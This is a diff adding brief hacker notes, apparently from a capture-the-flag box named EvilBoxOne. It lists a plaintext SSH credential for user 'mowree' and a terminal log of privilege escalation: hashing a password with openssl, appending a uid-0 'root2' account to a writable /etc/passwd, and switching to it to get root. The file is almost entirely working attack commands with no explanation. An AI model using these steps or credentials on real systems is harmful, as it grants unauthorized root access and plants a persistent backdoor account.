@@ -1,0 +1,13 @@
+H4x0r: Found on robots.txt
+
+ssh file for mowree
+mowree:unicorn
+
+
+mowree@EvilBoxOne:/tmp$ openssl passwd fake
+nypzT0GRtIljA
+mowree@EvilBoxOne:/tmp$ echo "root2:nypzT0GRtIljA:0:0:root:/root:/bin/bash" >> /etc/passwd
+mowree@EvilBoxOne:/tmp$ su root2
+Contraseña: 
+root@EvilBoxOne:/tmp# whoami
+root
